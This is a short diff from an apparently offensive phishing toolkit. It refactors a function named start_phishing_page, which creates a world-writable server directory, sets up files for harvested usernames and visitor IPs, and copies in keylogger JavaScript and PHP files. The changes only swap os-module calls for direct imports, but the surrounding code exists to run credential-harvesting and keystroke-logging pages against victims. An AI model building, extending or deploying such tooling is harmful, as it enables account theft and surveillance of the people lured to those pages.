@@ -231,10 +231,9 @@ ________________________________________________________________________________
 
 def start_phishing_page(page, custom_option):  # Phishing pages selection menu
     chmod('Server', 777)
-    os.chmod('Server', 777)
     rmtree("Server/www", onerror=simple_informant.remove_readonly)
-    os.mkdir('Server/www')
-    os.chmod('Server/www', 777)
+    mkdir('Server/www')
+    chmod('Server/www', 777)
     pathlib_Path('Server/www/usernames.txt').touch()
     pathlib_Path('Server/www/ip.txt').touch()
     copyfile('WebPages/ip.php', 'Server/www/ip.php')
@@ -242,7 +241,7 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
     copyfile('WebPages/keylogger.js', 'Server/www/keylogger.js')
     copyfile('WebPages/keylogger.php', 'Server/www/keylogger.php')
     try:
-        os.remove('link.url')
+        remove('link.url')
     except:
         pass
 
